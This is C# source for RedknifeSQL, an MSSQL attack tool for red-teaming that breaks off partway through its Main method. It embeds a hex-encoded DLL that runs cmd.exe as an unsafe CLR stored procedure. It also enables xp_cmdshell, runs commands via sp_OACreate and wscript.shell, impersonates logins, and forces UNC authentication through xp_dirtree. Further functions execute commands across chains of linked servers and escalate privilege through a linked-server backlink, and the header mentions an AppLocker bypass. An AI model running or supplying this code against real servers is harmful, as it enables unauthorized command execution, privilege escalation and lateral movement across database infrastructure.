using System;
using System.Collections.Generic;
using System.Configuration.Install;
using System.Data.SqlClient;
using System.IO;
using System.Text;

/// <summary>
/// RedknifeSQL by ka7ana (Darren King)
/// A simple C# console based utility for connecting to MSSQL servers and executing a number operations relating to pen-testing/red-teaming.
/// Launch with "--debug" flag to enable debug mode - this will output the generated/executed SQL queries to the console.
/// Can also be run as an uninstaller (applocker bypass) - 
///   - if redknifesql.txt is located in same directory as the executable, args will be read from this file and program runs in non-interactive mode.
///   - if no redknifesql.txt found, program runs in interactive mode as per normal execution.
/// </summary>
namespace RedknifeSQL
{
    public class RedknifeSQL
    { 
        private const string STORED_PROC_ASSEMBLY = "0x4D5A90000300000004000000FFFF0000B800000000000000400000000000000000000000000000000000000000000000000000000000000000000000800000000E1FBA0E00B409CD21B8014CCD21546869732070726F6772616D2063616E6E6F742062652072756E20696E20444F53206D6F64652E0D0D0A240000000000000050450000648602005FDAFAD40000000000000000F00022200B023000000C000000040000000000000000000000200000000000800100000000200000000200000400000000000000060000000000000000600000000200000000000003006085000040000000000000400000000000000000100000000000002000000000000000000000100000000000000000000000000000000000000000400000C80300000000000000000000000000000000000000000000000000000C2A0000380000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000002000004800000000000000000000002E74657874000000A70A000000200000000C000000020000000000000000000000000000200000602E72737263000000C80300000040000000040000000E00000000000000000000000000004000004000000000000000000000000000000000000000000000000000000000000000000000000000000000480000000200050014210000F8080000010000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000013300600B500000001000011731000000A0A066F1100000A72010000706F1200000A066F1100000A7239000070028C12000001281300000A6F1400000A066F1100000A166F1500000A066F1100000A176F1600000A066F1700000A26178D17000001251672490000701F0C20A00F00006A731800000AA2731900000A0B281A00000A076F1B00000A0716066F1C00000A6F1D00000A6F1E00000A6F1F00000A281A00000A076F2000000A281A00000A6F2100000A066F2200000A066F2300000A2A1E02282400000A2A00000042534A4201000100000000000C00000076342E302E33303331390000000005006C000000B8020000237E0000240300001004000023537472696E6773000000003407000058000000235553008C0700001000000023475549440000009C0700005C01000023426C6F620000000000000002000001471502000900000000FA013300160000010000001C000000020000000200000001000000240000000F000000010000000100000003000000000077020100000000000600960132030600030232030600B40000030F00520300000600DC00960206007901960206005A0196020600EA0196020600B60196020600CF0196020600090196020600C80013030600A600130306003D0196020600240140020600A4038F020A00F300DF020A005A0261030E00870300030A006A00DF020E00B6020003060070028F020A002000DF020A00960014000A00F603DF020A008E00DF020600C7020A000600D4020A000000000001000000000001000100010010007603000041000100010048200000000096002102620001000921000000008618FA02060002000000010062000900FA0201001100FA0206001900FA020A002900FA0210003100FA0210003900FA0210004100FA0210004900FA0210005100FA0210005900FA0210006100FA0215006900FA0210007100FA0210007900FA0210008900FA0206009900FA0206009900A8022100A90078001000B1009D032600A9008F031000A9002C021500A900DB0315009900C2032C00B900FA023000A100FA023800C90085003F00D100B70344009900C8034A00E10049004F00810064024F00A1006D025300D10001044400D100530006009900AB0306009900A00006008100FA02060020007B0055012E000B0068002E00130071002E001B0090002E00230099002E002B00B2002E003300B2002E003B00B2002E00430099002E004B00B8002E005300B2002E005B00B2002E006300D0002E006B00FA002E00730007011A000480000001000000000000000000000000003500000004000000000000000000000059002C0000000000040000000000000000000000590014000000000004000000000000000000000059008F02000000000000003C4D6F64756C653E0053797374656D2E494F0053797374656D2E446174610053716C4D65746144617461006D73636F726C69620053514C436C69656E7453746F72656450726F630052656164546F456E640053656E64526573756C7473456E6400636F6D6D616E640053716C446174615265636F7264007365745F46696C654E616D65006765745F506970650053716C506970650053716C44625479706500436C6F736500477569644174747269627574650044656275676761626C6541747472696275746500436F6D56697369626C6541747472696275746500417373656D626C795469746C654174747269627574650053716C50726F63656475726541747472696275746500417373656D626C7954726164656D61726B417474726962757465005461726765744672616D65776F726B41747472696275746500417373656D626C7946696C6556657273696F6E41747472696275746500417373656D626C79436F6E66696775726174696F6E41747472696275746500417373656D626C794465736372697074696F6E41747472696275746500436F6D70696C6174696F6E52656C61786174696F6E7341747472696275746500417373656D626C7950726F6475637441747472696275746500417373656D626C79436F7079726967687441747472696275746500417373656D626C79436F6D70616E794174747269627574650052756E74696D65436F6D7061746962696C69747941747472696275746500636D6445786563757465007365745F5573655368656C6C457865637574650053797374656D2E52756E74696D652E56657273696F6E696E670053716C537472696E6700546F537472696E6700536574537472696E670053514C436C69656E7453746F72656450726F632E646C6C0053797374656D0053797374656D2E5265666C656374696F6E006765745F5374617274496E666F0050726F636573735374617274496E666F0053747265616D5265616465720054657874526561646572004D6963726F736F66742E53716C5365727665722E536572766572002E63746F720053797374656D2E446961676E6F73746963730053797374656D2E52756E74696D652E496E7465726F7053657276696365730053797374656D2E52756E74696D652E436F6D70696C6572536572766963657300446562756767696E674D6F6465730053797374656D2E446174612E53716C54797065730053746F72656450726F636564757265730050726F63657373007365745F417267756D656E747300466F726D6174004F626A6563740057616974466F72457869740053656E64526573756C74735374617274006765745F5374616E646172644F7574707574007365745F52656469726563745374616E646172644F75747075740053716C436F6E746578740053656E64526573756C7473526F7700003743003A005C00570069006E0064006F00770073005C00530079007300740065006D00330032005C0063006D0064002E00650078006500000F20002F00430020007B0030007D00000D6F007500740070007500740000000495DD57679D1B4DAB05547E3931C0F300042001010803200001052001011111042001010E0420010102060702124D125104200012550500020E0E1C03200002072003010E11610A062001011D125D0400001269052001011251042000126D0320000E05200201080E08B77A5C561934E0890500010111490801000800000000001E01000100540216577261704E6F6E457863657074696F6E5468726F7773010801000200000000001801001353514C436C69656E7453746F72656450726F63000005010000000017010012436F7079726967687420C2A920203230323300002901002463383439373634622D346530352D346662632D386532362D36623730613732366630363900000C010007312E302E302E3000004D01001C2E4E45544672616D65776F726B2C56657273696F6E3D76342E372E320100540E144672616D65776F726B446973706C61794E616D65142E4E4554204672616D65776F726B20342E372E3204010000000000000000003291F7D2000000000200000063000000442A0000440C000000000000000000000000000010000000000000000000000000000000525344537C9B8A60440F8B4E9B32400900576C79010000005A3A5C436F6E736F6C65417070315C53514C436C69656E7453746F72656450726F635C6F626A5C7836345C52656C656173655C53514C436C69656E7453746F72656450726F632E70646200000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000001001000000018000080000000000000000000000000000001000100000030000080000000000000000000000000000001000000000048000000584000006C03000000000000000000006C0334000000560053005F00560045005200530049004F004E005F0049004E0046004F0000000000BD04EFFE00000100000001000000000000000100000000003F000000000000000400000002000000000000000000000000000000440000000100560061007200460069006C00650049006E0066006F00000000002400040000005400720061006E0073006C006100740069006F006E00000000000000B004CC020000010053007400720069006E006700460069006C00650049006E0066006F000000A802000001003000300030003000300034006200300000001A000100010043006F006D006D0065006E007400730000000000000022000100010043006F006D00700061006E0079004E0061006D0065000000000000000000500014000100460069006C0065004400650073006300720069007000740069006F006E0000000000530051004C0043006C00690065006E007400530074006F00720065006400500072006F0063000000300008000100460069006C006500560065007200730069006F006E000000000031002E0030002E0030002E003000000050001800010049006E007400650072006E0061006C004E0061006D0065000000530051004C0043006C00690065006E007400530074006F00720065006400500072006F0063002E0064006C006C0000004800120001004C006500670061006C0043006F007000790072006900670068007400000043006F0070007900720069006700680074002000A90020002000320030003200330000002A00010001004C006500670061006C00540072006100640065006D00610072006B00730000000000000000005800180001004F0072006900670069006E0061006C00460069006C0065006E0061006D0065000000530051004C0043006C00690065006E007400530074006F00720065006400500072006F0063002E0064006C006C000000480014000100500072006F0064007500630074004E0061006D00650000000000530051004C0043006C00690065006E007400530074006F00720065006400500072006F0063000000340008000100500072006F006400750063007400560065007200730069006F006E00000031002E0030002E0030002E003000000038000800010041007300730065006D0062006C0079002000560065007200730069006F006E00000031002E0030002E0030002E0030000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000";

        private const string LINKED_SERVERS_QUERY = "SELECT srv.name, srv.product, srv.data_source, srv.is_remote_login_enabled AS 'remote_login_enabled', srv.is_rpc_out_enabled AS 'rpc_out_enabled', sp.name AS 'local_principal', ll.remote_name AS 'remote_principal'  FROM sys.servers AS srv INNER JOIN sys.linked_logins AS ll ON srv.server_id = ll.server_id INNER JOIN sys.server_principals AS sp ON ll.local_principal_id = sp.principal_id WHERE srv.is_linked = 1";

        private const string SEPARATOR = "======================================================================";

        public bool Debug { get; set; }

        public string ConnectionString { get; set; }
        public string Server { get; set; }
        public string Database { get; set; }

        public string SystemUser { get; set; }
        public string UserName { get; set; }
        public string ExecuteAsLogin { get; set; }
        public string ExecuteAsUser { get; set; }

        protected SqlConnection connection;

        public RedknifeSQL()
        {
            this.Debug = false;
        }

        
        /// <summary>
        /// Sets the path to an output file. All data written to the console will be redirected to this path.
        /// </summary>
        /// <param name="outputFile"></param>
        public void SetOutputFile(string outputFile)
        {
            try
            {
                FileStream fs = new FileStream(outputFile, FileMode.OpenOrCreate, FileAccess.Write);
                StreamWriter writer = new StreamWriter(fs);
                writer.AutoFlush = true;
                Console.SetOut(writer);
                Console.SetError(writer);
            } catch (Exception ex)
            {
                Console.WriteLine("Could not open '{0}' for writing: {1}", outputFile, ex.ToString());
                Environment.Exit(1);
            }
        }

        public void DoScript(string inputFile)
        {
            this.HandleGetUserInformation();
            this.HandleGetImpersonatablebleRoles();
            this.HandleGetServerPrincipals();
            this.HandleCheckXPCmdShellStatus();
            this.HandleListTrustworthDBs();
            this.HandleGetLinkedSQLServerInfo();

            string sql = null;
            try
            {
                sql = File.ReadAllText(inputFile);
            } catch (Exception ex)
            {
                Console.WriteLine("Error - could not read SQL from input file: {0}", ex.ToString());
                Environment.Exit(1);
            }

            Console.WriteLine(SEPARATOR);
            Console.WriteLine("[+] Reading input script from file: {0}", inputFile);
            Console.WriteLine("[+] Attempting to execute script:");
            Console.WriteLine(SEPARATOR);
            Console.WriteLine(sql);
            Console.WriteLine(SEPARATOR);
            Console.WriteLine("[+] Script output:");
            Console.WriteLine(SEPARATOR);

            SqlCommand cmd = this.connection.CreateCommand();
            cmd.CommandText = sql;
            SqlDataReader reader = cmd.ExecuteReader();
            while(reader.HasRows)
            {
                PrintReaderAsTable(reader);
                reader.NextResult();
                Console.WriteLine(SEPARATOR);
            }
            reader.Close();

            Console.WriteLine("DONE! Exiting...");
        }

        public void DoClient()
        {
            PrintStatus("Debug status: " + this.Debug + " (enable using the --debug cmd line arg)");
            // Print connection options on first call
            PrintOptions();

            bool keepRunning = true;
            while (keepRunning)
            {
                PrintStatus("", false);

                try
                {
                    string input = Console.ReadLine().Trim().ToLower();
                   
                    switch (input)
                    {
                        case "1":
                            HandleConnect();
                            break;
                        case "2":
                            HandleGetUserInformation();
                            break;
                        case "3":
                            HandleGetImpersonatablebleRoles();
                            break;
                        case "4":
                            HandleConnectToUNCPath();
                            break;
                        case "5":
                            HandleSetExecuteAsLoginValue();
                            break;
                        case "6":
                            HandleSetExecuteAsUserValue();
                            break;
                        case "7":
                            HandleCheckXPCmdShellStatus();
                            break;
                        case "8":
                            HandleSetXPCmdShellStatus();
                            break;
                        case "9":
                            HandleXPCmdShell();
                            break;
                        case "10":
                            HandleSPOAMethodExectuion();
                            break;
                        case "11":
                            HandleListTrustworthDBs();
                            break;
                        case "12":
                            HandleCreateAssemblyStoredProc();
                            break;
                        case "13":
                            HandleCallAssemblyStoredProc();
                            break;
                        case "14":
                            HandleGetLinkedSQLServerInfo();
                            break;
                        case "15":
                            HandleCallXPCmdshellOnLinkedServer();
                            break;
                        case "16":
                            HandlePrivEscViaLinkedServerBacklink();
                            break;
                        case "17":
                            HandleExecuteSQL();
                            break;
                        case "18":
                            HandleGetServerPrincipals();
                            break;
                        case "q":
                        case "quit":
                        case "exit":
                            keepRunning = false;
                            break;
                        default:
                            PrintStatus(String.Format("Invalid option: {0}", input));
                            PrintOptions();
                            break;
                    }
                }
                catch (Exception ex)
                {
                    PrintStatus("ERROR: " + ex.Message);
                    if (this.Debug)
                    {
                        PrintStatus("FULL STACK TRACE:\n" + ex.ToString());
                    }
                }
            }

            // Check connection is closed
            if (this.connection != null)
            {
                this.connection.Close();
            }
            PrintStatus("Exiting...");
        }

        protected void PrintOptions()
        {
            Console.WriteLine("");
            PrintStatus("Options:");
            Console.WriteLine("   1 - Connect to server");
            Console.WriteLine("   2 - Get current user information");
            Console.WriteLine("   3 - Get impersonatable roles");
            Console.WriteLine("   4 - Connect to UNC path");
            Console.WriteLine("   5 - Set 'EXECUTE AS LOGIN' value");
            Console.WriteLine("   6 - Set 'EXECUTE AS USER' value");
            Console.WriteLine("   7 - Check if xp_cmdshell enabled");
            Console.WriteLine("   8 - Set xp_cmdshell status");
            Console.WriteLine("   9 - Execute xp_cmdshell");
            Console.WriteLine("  10 - Execute cmd via sp_OACreate/sp_OAMethod");
            Console.WriteLine("  11 - List TRUSTWORTHY databases");
            Console.WriteLine("  12 - Create assembly stored procedure");
            Console.WriteLine("  13 - Execute cmd via assembly stored procedure");
            Console.WriteLine("  14 - Get linked SQL server info");
            Console.WriteLine("  15 - Call xp_cmdshell on linked server");
            Console.WriteLine("  16 - PrivEsc via callback xp_cmdshell from linked server");
            Console.WriteLine("  17 - Execute SQL Command");
            Console.WriteLine("  18 - Get server principals");
            Console.WriteLine("   Q - Quit");
        }

        protected void HandleConnect()
        {
            PrintStatus("Connect to database");
            Console.Write("  Server (default: localhost): ");
            string server = Console.ReadLine().Trim();
            Console.Write("  Database (default: master): ");
            string database = Console.ReadLine().Trim();

            this.DoConnect(server, database);
        }

        protected void DoConnect(string server, string database) 
        {
            // Validate the server 
            if (string.IsNullOrEmpty(server))
            {
                server = "localhost";
            }

            // Validate the database
            if (string.IsNullOrEmpty(database))
            {
                database = "master";
            }

            if (this.IsConnected())
            {
                this.connection.Close();
            }
            PrintStatus(string.Format("Connecting to {0}.{1}...", server, database));

            this.Server = server;
            this.Database = database;
            this.ConnectionString = string.Format("Server={0}; Database={1}; Integrated Security = True;", this.Server, this.Database);

            this.connection = new SqlConnection(this.ConnectionString);
            try
            {
                this.connection.Open();
                Console.WriteLine("  Connected - auth success!");
                HandleGetUserInformation();
            }
            catch
            {
                Console.WriteLine("  Connection failed - auth failed!");
            }
        }

        protected void HandleGetUserInformation()
        {
            
            this.SystemUser = QuerySingleValue("SELECT SYSTEM_USER;");
            this.UserName = QuerySingleValue("SELECT USER_NAME();");

            PrintStatus("Getting current user information...");
            Console.WriteLine("  SYSTEM_USER (Windows user): {0}", this.SystemUser);
            Console.WriteLine("  USER_NAME (DB user): {0}", this.UserName);

            // Check roles
            Console.WriteLine("  Has 'public' role: {0}", CheckRole("public"));
            Console.WriteLine("  Has 'sysadmin' role: {0}", CheckRole("sysadmin"));
        }

        protected void HandleGetImpersonatablebleRoles()
        {
            PrintStatus("Getting impersonatable roles...");

            SqlDataReader reader = ExecuteQuery("SELECT distinct b.name FROM sys.server_permissions a INNER JOIN sys.server_principals b ON a.grantor_principal_id = b.principal_id WHERE a.permission_name = 'IMPERSONATE';");
            Console.WriteLine("  Logins that can be impersonated:");
            while (reader.Read())
            {
                Console.WriteLine("    {0}", reader[0]);
            }
            reader.Close();
        }

        protected void HandleConnectToUNCPath()
        {
            PrintStatus("Connect to UNC path");
            Console.Write("  Enter UNC path to connect to: ");
            string path = Console.ReadLine();

            Console.WriteLine("  Connecting to '{0}' using xp_dirtree", path);
            SqlDataReader reader = ExecuteQuery(string.Format("EXEC master..xp_dirtree\"{0}\";", path));
            reader.Close();
        }

        protected void HandleSetExecuteAsLoginValue()
        {
            PrintStatus("Set login value (impersonation)");
            Console.Write("  Enter login value: ");
            string user = Console.ReadLine();

            this.ExecuteAsLogin = user;

            this.ExecuteNonQuery(string.Format("EXECUTE AS LOGIN = '{0}'", this.ExecuteAsLogin));
        }

        protected void HandleSetExecuteAsUserValue()
        {
            PrintStatus("Set user value (impersonation)");
            Console.Write("  Enter user value: ");
            string user = Console.ReadLine();

            this.ExecuteAsUser = user;

            this.ExecuteNonQuery("use msdb");
            this.ExecuteNonQuery(string.Format("EXECUTE AS USER = '{0}'", this.ExecuteAsUser));
        }

        protected void HandleCheckXPCmdShellStatus()
        {
            PrintStatus("Checking xp_cmdshell status...");

            // Check if execute as login 'sa' set?

            string query = "EXEC sp_configure 'show advanced options', 1; RECONFIGURE; SELECT name, CONVERT(INT, ISNULL(value, value_in_use)) AS IsConfigured FROM sys.configurations WHERE name = 'xp_cmdshell';";
            SqlDataReader reader = this.ExecuteQuery(query);
            reader.Read();
            Console.WriteLine("  xp_cmdshell enabled: {0}", reader[1]);
            reader.Close();
        }

        protected void HandleSetXPCmdShellStatus()
        {
            PrintStatus("Setting xp_cmdshell status (requires elevated permissions)");
            Console.Write("  Enter status to set xp_cmdshell(1 = enabled, 0 = disabled): ");
            string value = Console.ReadLine().Trim();
            value = (value == "1" ? "1" : "0");

            Console.WriteLine("  Setting xp_cmdshell status to: {0}", value);
            string query = string.Format("EXEC sp_configure 'show advanced options', 1; RECONFIGURE; EXEC sp_configure 'xp_cmdshell', {0}; RECONFIGURE;", value);
            SqlDataReader reader = this.ExecuteQuery(query);
            reader.Close();

            this.HandleCheckXPCmdShellStatus();
        }

        protected void HandleXPCmdShell()
        {
            PrintStatus("Execute cmd with xp_cmdshell...");
            Console.Write("  Enter cmd to execute with xp_cmdshell: ");
            string cmd = Console.ReadLine().Trim();

            Console.WriteLine("  Executing: {0}", cmd);
            string query = string.Format("EXEC xp_cmdshell {0}", cmd);
            SqlDataReader reader = ExecuteQuery(query);
            reader.Read();
            Console.WriteLine("  xp_cmdshell output: {0}{1}", Environment.NewLine, reader[0]);
            reader.Close();
        }

        protected void HandleSPOAMethodExectuion()
        {
            PrintStatus("Execute cmd with sp_OAMethod...");
            Console.Write("  Enter cmd to execute with sp_OAMethod: ");
            string cmd = Console.ReadLine().Trim();

            Console.WriteLine("  Executing: {0}", cmd);
            string query = "EXEC sp_configure 'Ole Automation Procedures', 1; ";
            query += "RECONFIGURE; DECLARE @myshell INT; EXEC sp_oacreate 'wscript.shell', @myshell OUTPUT; ";
            query += string.Format("EXEC sp_oamethod @myshell, 'run', null, '{0}';", cmd);

            SqlDataReader reader = ExecuteQuery(query);
            reader.Read();
            Console.WriteLine("  Output from sp_OAMethod not available");
            reader.Close();
        }

        protected void HandleListTrustworthDBs()
        {
            PrintStatus("Listing databases with TRUSTWORTHY property...");

            string query = @"SELECT SUSER_SNAME(owner_sid) AS DBOWNER,
                d.name AS DATABASENAME
                FROM sys.server_principals r
                INNER JOIN sys.server_role_members m ON r.principal_id = m.role_principal_id
                INNER JOIN sys.server_principals p ON p.principal_id = m.member_principal_id
                INNER JOIN sys.databases d ON suser_sname(d.owner_sid) = p.name
                WHERE is_trustworthy_on = 1";

            SqlDataReader reader = ExecuteQuery(query);
            while (reader.Read())
            {
                Console.WriteLine("    {1} (Owner: {0})", reader[0], reader[1]);
            }
            reader.Close();
        }

        protected void HandleCreateAssemblyStoredProc()
        {
            PrintStatus("Creating stored procedure from DLL...");

            Console.Write("  Enter name of database to create stored proc in (default: msdb): ", false);
            string db = Console.ReadLine();
            if (string.IsNullOrEmpty(db)) db = "msdb";

            string query = @"use {0};
                EXECUTE AS LOGIN = 'sa';

                EXEC sp_configure 'show advanced options',1;
                RECONFIGURE;

                EXEC sp_configure 'clr enabled',1;
                RECONFIGURE;

                EXEC sp_configure 'clr strict security', 0;
                RECONFIGURE;";

            this.ExecuteNonQuery(string.Format(query, db));

            this.ExecuteNonQuery("DROP PROCEDURE IF EXISTS [dbo].[cmdExecute]");
            this.ExecuteNonQuery("DROP ASSEMBLY IF EXISTS tmpAssembly");
            this.ExecuteNonQuery(string.Format("CREATE ASSEMBLY tmpAssembly FROM {0} WITH PERMISSION_SET = UNSAFE", STORED_PROC_ASSEMBLY));
            this.ExecuteNonQuery("CREATE PROCEDURE [dbo].[cmdExecute] @command NVARCHAR(4000) AS EXTERNAL NAME [tmpAssembly].[StoredProcedures].[cmdExecute]");
        }

        protected void HandleCallAssemblyStoredProc()
        {

            PrintStatus("Execute cmd via assembly stored proc...");
            Console.Write("  Enter name of database to call stored proc in (default: msdb): ");
            string db = Console.ReadLine();
            if (string.IsNullOrEmpty(db)) db = "msdb";

            Console.Write("  Enter the command to execute: ");
            string cmd = Console.ReadLine();

            string query = string.Format("USE {0}; EXEC cmdExecute '{1}';", db, cmd);
            SqlDataReader reader = ExecuteQuery(query);
            reader.Read();

            Console.WriteLine("  Output:");
            Console.WriteLine(reader[0]);

            reader.Close();
        }

        protected void HandleGetLinkedSQLServerInfo()
        {
            PrintStatus("Getting linked SQL servers...\n");

            QueryResults results = new QueryResults(this.ExecuteQuery(LINKED_SERVERS_QUERY));
            PrintReaderAsTable(results);
            Console.WriteLine(SEPARATOR);

            foreach(string[] row in results.Rows)
            {
                string server = row[0];
                try
                {
                    PrintLinkedServerInfo(server);
                }
                catch (Exception ex)
                {
                    Console.WriteLine("    ERROR: {0}", ex.Message);
                    Console.WriteLine("");
                }
            }
        }

        protected void PrintLinkedServerInfo(string server)
        {
            Console.WriteLine("  Getting info for linked server: {0}", server);

            string query = string.Format("select version, SYSTEM_USER, USER_NAME, public_role, sysadmin_role from openquery(\"{0}\", 'select @@version as ''version'', SYSTEM_USER as ''SYSTEM_USER'', USER_NAME() as ''USER_NAME'', IS_SRVROLEMEMBER(''public'') as ''public_role'', IS_SRVROLEMEMBER(''sysadmin'') as ''sysadmin_role''')", server);
            SqlDataReader reader = ExecuteQuery(query);
            reader.Read();
            Console.WriteLine("    Version: {0}", reader[0]);
            Console.WriteLine("    SYSTEM USER: {0}", reader[1]);
            Console.WriteLine("    USER NAME: {0}", reader[2]);
            Console.WriteLine("    Has 'public' role: {0}", reader[3]);
            Console.WriteLine("    Has 'sysadmin' role: {0}", reader[4]);
            Console.WriteLine("");
            reader.Close();

            // Get linked servers on linked server
            Console.WriteLine(string.Format("    Getting linked servers for linked server '{0}'...\n", server));
            query = string.Format("EXEC ('{0}') AT [{1}]", LINKED_SERVERS_QUERY.Replace("'", "''"), server);
            reader = ExecuteQuery(query);
            QueryResults results = new QueryResults(reader);
            reader.Close();

            foreach(string[] row in results.Rows)
            {
                string linkedServer = row[0];

                // Get the user for the linked server
                query = string.Format("select mylogin from openquery(\"{0}\", 'select mylogin from openquery(\"{1}\", ''select SYSTEM_USER as mylogin'')')", server, linkedServer);
                reader = ExecuteQuery(query);
                reader.Read();
                string lsUser = reader[0].ToString();
                reader.Close();

                // Print the linked server's linked servers...
                PrintReaderAsTable(results);
                Console.WriteLine(SEPARATOR);
            }
        }

        protected void HandleCallXPCmdshellOnLinkedServer()
        {
            PrintStatus("Calling xp_cmdshell on linked server...");

            Console.Write("  Enter name of linked server (separate with ',' if chain): ");
            string server = Console.ReadLine().Trim();
            string[] servers = server.Split(',');

            if (servers.Length > 1)
            {
                Console.WriteLine("  Execution chain:");
                for (int i = 0; i < servers.Length; i++)
                {
                    servers[i] = servers[i].Trim();
                    Console.WriteLine("  {0}- {1}", new String(' ', 2 * (i+1)), servers[i]);
                }
            }

            // Get the command to execute:
            string cmd = this.GetInputValue(string.Format("  Enter cmd to execute on {0}: ", servers[servers.Length - 1]));
            
            string preQuery = "";
            string postQuery = "";
            for (int i = 0; i < servers.Length; i++)
            {
                string quotes = new string('\'', (int)Math.Pow(2, i));
                preQuery += string.Format("EXEC ({0}", quotes);
                postQuery = string.Format("{0}) AT [{1}]", quotes, servers[i]) + postQuery;
            }
            
            // Enable advanced options on destination
            Console.WriteLine("    Enabling advanced options...");
            string query = string.Format("{0}sp_configure {1}show advanced options{1}, 1; RECONFIGURE;{2}", preQuery, new String('\'', (int)Math.Pow(2, servers.Length)), postQuery);
            ExecuteNonQuery(query);

            // Enable xp_cmdshell on destination
            Console.WriteLine("    Enabling xp_cmdshell...");
            query = string.Format("{0}sp_configure {1}xp_cmdshell{1}, 1; RECONFIGURE;{2}", preQuery, new String('\'', (int)Math.Pow(2, servers.Length)), postQuery);
            ExecuteNonQuery(query);

            // Need to escape any single quotes in cmd - replace each quote with Math.Pow(2, servers.Length + 1)
            cmd = cmd.Replace("'", new String('\'', (int)Math.Pow(2, servers.Length + 1)));

            Console.WriteLine("    Executing cmd on destination server: {0}", servers[servers.Length - 1]);
            query = string.Format("{0}xp_cmdshell {1}{2}{1}{3}", preQuery, new String('\'', (int)Math.Pow(2, servers.Length)), cmd, postQuery);
            SqlDataReader reader = ExecuteQuery(query);
            StringBuilder output = new StringBuilder();
            while(reader.Read())
            {
                output.Append(reader[0] + "\n");
            }
           
            Console.WriteLine("  Output: {0}\n", output.ToString());
            reader.Close();
        }

        protected void HandlePrivEscViaLinkedServerBacklink()
        {
            // ask for name of server connected to
            // ask for name of linked server
            // execute all of HandleCallXPCmdshellOnLinkedServer, but at the linked server on connected server

            PrintStatus("PrivEsc callback - calling xp_cmdshell on current server via linked server...");

            Console.Write("  Enter name of connected server: ");
            string connectedServer = Console.ReadLine().Trim();

            Console.Write("  Enter name of linked server: ");
            string linkedServer = Console.ReadLine().Trim();

            string query = string.Format("EXEC ('EXEC (''sp_configure ''''show advanced options'''', 1; reconfigure;'') AT [{0}]') AT [{1}]", connectedServer, linkedServer);
            Console.WriteLine("    Enabling advanced options...");
            ExecuteNonQuery(query);

            query = string.Format("EXEC ('EXEC (''sp_configure ''''xp_cmdshell'''', 1; RECONFIGURE;'') AT [{0}]') AT [{1}]", connectedServer, linkedServer);
            Console.WriteLine("    Enabling xp_cmdshell...");
            ExecuteNonQuery(query);

            string cmd = this.GetInputValue(string.Format("  Enter cmd to execute on {0}: ", connectedServer));
            query = string.Format("EXEC ('EXEC (''xp_cmdshell ''''{0}'''''') AT [{1}]') AT [{2}]", cmd, connectedServer, linkedServer);
            SqlDataReader reader = ExecuteQuery(query);
            reader.Read();
            Console.WriteLine("  Output: {0}", reader[0]);
            reader.Close();
        }

        protected void HandleExecuteSQL()
        {
            PrintStatus("Execute SQL - executing arbitrary SQL statement/command...");

            Console.Write("  Enter SQL to execute: ");
            string sql = Console.ReadLine().Trim();
            SqlDataReader reader = ExecuteQuery(sql);

            this.PrintReaderAsTable(reader);

            reader.Close();
        }

        protected void HandleGetServerPrincipals()
        {
            PrintStatus("Getting server principals");

            string sql = "SELECT name, principal_id, type_desc, default_database_name FROM sys.server_principals";
            SqlDataReader reader = ExecuteQuery(sql);
            this.PrintReaderAsTable(reader);
            reader.Close();
        }

        protected void PrintReaderAsTable(SqlDataReader reader)
        {
            this.PrintReaderAsTable(new QueryResults(reader));
        }

        protected void PrintReaderAsTable(QueryResults results) 
        { 
            // Build the format string
            string fmtStr = "";
            for (int i = 0; i < results.LongestValues.Length; i++)
            {
                if (i > 0) fmtStr += " | ";
                fmtStr += "{" + i + "," + results.LongestValues[i] + "}";
            }

            // Print the headers and separator
            string headerString = String.Format(fmtStr, results.Headers);

            Console.WriteLine(headerString);
            string separator = "";
            for(int i=0; i < results.LongestValues.Length; i++)
            {
                if (i > 0) separator += " | ";
                separator += new string('-', results.LongestValues[i]);
            }
            Console.WriteLine(separator);
            
            // Now print each row
            foreach(string[] row in results.Rows)
            {
                Console.WriteLine(String.Format(fmtStr, row));
            }
            Console.WriteLine("");
            Console.WriteLine("  {0} {1}", results.Rows.Count, (results.Rows.Count == 1 ? "ROW" : "ROWS"));
            Console.WriteLine("");
        }

        protected void PrintStatus(string status, bool newline = true)
        {
            string text = String.Format("[{0}] > {1}{2}", this.GetConnectionInfo(), status, (newline ? Environment.NewLine : ""));
            Console.Write(text);
        }

        protected string GetConnectionInfo()
        {
            if (this.IsConnected())
            {
                string username = (this.ExecuteAsUser != null ? this.ExecuteAsUser : this.UserName);
                string loginname = (this.ExecuteAsLogin != null ? this.ExecuteAsLogin : this.SystemUser);

                return String.Format("{0},{1}@{2}.{3}", username, loginname, this.Server, this.Database);
            } else
            {
                return "NOT CONNECTED";
            }
        }

        protected bool IsConnected()
        {
            return this.connection != null && this.connection.State == System.Data.ConnectionState.Open;
        }

        public static void Main(string[] args)
        {
            RedknifeSQL client = new RedknifeSQL();
            string server = null;
            string db = null;
            string script = null;
            string outputFile = null;
            try
            {
                for (int i = 0; i < args.Length; i++)
                {
                    string arg = args[i];

                    if (arg.Equals("--debug"))
                    {
                        client.Debug = true;
                    }
                    else if (arg.Equals("--server"))
                    {
                        server = args[++i].Trim();
                    }
                    else if (arg.Equals("--db"))
                    {
                        db = args[++i].Trim();
                    }
                    else if (arg.Equals("--script"))
                    {
                        script = args[++i].Trim();
                    }
                    else if (arg.Equals("--output"))
                    {
                        outputFile = args[++i].Trim();
                    }
                }
            } catch(Exception)
            {
                PrintUsage();
                return;
            }

            // If database is provided and server is null, set server to 'localhost'
            if (db != null && server == null) server = "localhost";
            // If server has been provided but no db, default to db="master"
            if (server != null && db == null) db = "master";

            // Validate script mode arguments
            if (script != null)
            {
                // Ensure we have a value for output
                if (outputFile == null || String.IsNullOrEmpty(outputFile)) outputFile = "redknifesql-output.txt";
                client.SetOutputFile(outputFile);

                // Ensure server and db are set
                if (server == null || db == null)
                {
                    Console.WriteLine("Both --server and --db must be specified when using --script mode");
                    return;
                }
            }

            // If server and db have been supplied, connect to the DB
            if (server != null)
            {
                Console.WriteLine("Setting connection details from arguments - ");
                Console.WriteLine("  Server: " + server);
                Console.WriteLine("  Database: " + db);
                client.DoConnect(server, db);
            }

            if (script != null)
            {
                Console.WriteLine("Starting script mode");
